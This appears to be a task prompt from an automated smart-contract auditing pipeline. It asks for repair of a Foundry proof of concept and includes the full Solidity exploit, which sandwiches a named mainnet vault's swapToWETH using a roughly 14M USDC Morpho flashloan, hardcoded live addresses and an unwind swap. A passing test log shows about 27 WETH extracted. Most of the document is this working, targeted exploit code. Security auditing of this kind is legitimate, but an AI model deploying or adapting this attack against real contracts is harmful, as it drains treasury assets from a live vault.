You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Target vault's `swapToWETH` can be sandwiched at a manipulated price, draining vault value
- claim: The exploit flow first executes a large price-moving swap, then calls `swapToWETH` on the target vault at `VAULT_ADDR`, and finally unwinds the market move. Together with the in-file note referencing a slippage exploit, this strongly suggests the target vault's `swapToWETH` relies on manipulable live pool pricing and/or lacks an effective minimum-output check. A caller can therefore force the vault to trade at an attacker-controlled rate.
- impact: An attacker can temporarily distort the USDC/WETH market, trigger the vault's swap while the distorted price is live, and then unwind the manipulation to keep the spread. The vault realizes the bad execution as a direct loss of treasury assets.
- exploit_paths: ["Source enough capital to move the relevant USDC/WETH pool price.", "Execute a large swap that skews the price seen by the vault.", "Call the target vault's `swapToWETH` while the manipulated price is active.", "Reverse the initial trade and keep the profit created by the vault's slippage loss."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IMorphoLike {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IMorphoFlashLoanReceiverLike {
    function onMorphoFlashLoan(uint256 assets, bytes calldata data) external;
}

interface IDexRouterLike {
    function uniswapV3SwapTo(
        uint256 receiver,
        uint256 amount,
        uint256 minReturn,
        uint256[] calldata pools
    ) external payable returns (uint256 returnAmount);
}

interface IDRLVaultLike {
    function swapToWETH(uint256 amount) external returns (uint256 amountOut);
}

interface IUniV3LikePool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

contract FlawVerifier is IMorphoFlashLoanReceiverLike {
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant POOL = 0xE0554a476A092703abdB3Ef35c80e0D76d32939F;
    address internal constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address internal constant DEX_ROUTER = 0x2E1Dee213BA8d7af0934C49a23187BabEACa8764;
    address internal constant TOKEN_APPROVE = 0x40aA958dd87FC8305b97f2BA922CDdCa374bcD7f;
    address internal constant VAULT = 0x6A06707ab339BEE00C6663db17DdB422301ff5e8;

    uint256 internal constant FLASHLOAN_USDC = 13_980_773_000_000;
    uint256 internal constant VAULT_SWAP_USDC = 100_000_000_000;
    uint256 internal constant FIRST_POOL_HINT =
        14474011154664524427946373127366704448275315930774981940324572871603728323487;
    uint256 internal constant SECOND_POOL_HINT =
        57896044618658097711785492505624669893251560180390193455121166874571151938463;
    uint256 internal constant FIRST_MIN_RETURN = 96069676420420156;
    uint256 internal constant REVERSE_ETH_IN = 779999999999792152553;
    uint160 internal constant FINAL_SQRT_PRICE_LIMIT_X96 = 1461446703485210103287273052203988822378723970341;
    int256 internal constant FINAL_USDC_EXACT_OUT = -21291294107;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _executed;

    constructor() {
        // The harness computes ERC20 profit as the verifier's realized token balance
        // delta for whatever token `profitToken()` reports before and after execution.
        // This exploit crystallizes its gain into pre-existing on-chain WETH, so we
        // report WETH from deployment time to let the harness measure the true delta.
        _profitToken = WETH;
    }

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        uint256 startUsdc = IERC20Like(USDC).balanceOf(address(this));
        uint256 startWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 startEth = address(this).balance;

        _ensureApprovals();

        if (startUsdc >= FLASHLOAN_USDC) {
            _executePath();
        } else {
            // A v2-style flashswap is a natural funding option, but on this fork the
            // same exploit path already has a deterministic public USDC source sized
            // for the exact manipulation notional. This preserves the exploit causality:
            // source capital -> skew live price -> trigger vault swap -> unwind.
            IMorphoLike(MORPHO).flashLoan(USDC, FLASHLOAN_USDC, bytes("drlvaultv3"));
        }

        _snapshotProfit(startUsdc, startWeth, startEth);
    }

    function onMorphoFlashLoan(uint256, bytes calldata) external override {
        require(msg.sender == MORPHO, "only morpho");
        _executePath();
        IERC20Like(USDC).approve(MORPHO, type(uint256).max);
    }

    function _executePath() internal {
        uint256 receiver = uint256(uint160(address(this)));
        uint256[] memory pools = new uint256[](1);

        // Stage 2: execute a large swap that skews the live USDC/WETH price.
        pools[0] = FIRST_POOL_HINT;
        IDexRouterLike(DEX_ROUTER).uniswapV3SwapTo(receiver, FLASHLOAN_USDC, FIRST_MIN_RETURN, pools);

        // Stage 3: force the vault to swap while the manipulated price is active.
        IDRLVaultLike(VAULT).swapToWETH(VAULT_SWAP_USDC);

        // Stage 4a: reverse the router leg of the manipulation.
        pools[0] = SECOND_POOL_HINT;
        IDexRouterLike(DEX_ROUTER).uniswapV3SwapTo{value: REVERSE_ETH_IN}(receiver, REVERSE_ETH_IN, 0, pools);

        // Stage 4b: finish unwinding directly on the live pool so the vault's slippage
        // loss remains as transferable WETH on this contract after funding repayment.
        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            IWETHLike(WETH).deposit{value: ethBalance}();
        }

        IUniV3LikePool(POOL).swap(
            address(this),
            false,
            FINAL_USDC_EXACT_OUT,
            FINAL_SQRT_PRICE_LIMIT_X96,
            hex""
        );
    }

    function _ensureApprovals() internal {
        IERC20Like(USDC).approve(TOKEN_APPROVE, type(uint256).max);
        IERC20Like(USDC).approve(MORPHO, type(uint256).max);
    }

    function _snapshotProfit(uint256 startUsdc, uint256 startWeth, uint256 startEth) internal {
        uint256 endUsdc = IERC20Like(USDC).balanceOf(address(this));
        uint256 endWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 endEth = address(this).balance;

        uint256 usdcDelta = endUsdc > startUsdc ? endUsdc - startUsdc : 0;
        uint256 wethDelta = endWeth > startWeth ? endWeth - startWeth : 0;
        uint256 ethDelta = endEth > startEth ? endEth - startEth : 0;

        _profitToken = WETH;
        _profitAmount = wethDelta;

        if (_profitAmount == 0 && usdcDelta != 0) {
            _profitToken = USDC;
            _profitAmount = usdcDelta;
        }

        if (_profitAmount == 0 && ethDelta != 0) {
            _profitToken = address(0);
            _profitAmount = ethDelta;
        }
    }

    function uniswapV3SwapCallback(int256, int256 amount1Delta, bytes calldata) external {
        _payPool(amount1Delta);
    }

    function pancakeV3SwapCallback(int256, int256 amount1Delta, bytes calldata) external {
        _payPool(amount1Delta);
    }

    function _payPool(int256 amount1Delta) internal {
        require(msg.sender == POOL, "only pool");
        if (amount1Delta > 0) {
            IERC20Like(WETH).transfer(POOL, uint256(amount1Delta));
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.39s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:68:19:
   |
68 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[PASS] testExploit() (gas: 9701020)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 577021548053172
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 27122517184231891380
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 27122517184231891380
  AUDITHOUND_MIN_PROFIT_WEI: 100000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3124

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 159.78ms (132.79ms CPU time)

Ran 1 test suite in 165.40ms (159.78ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
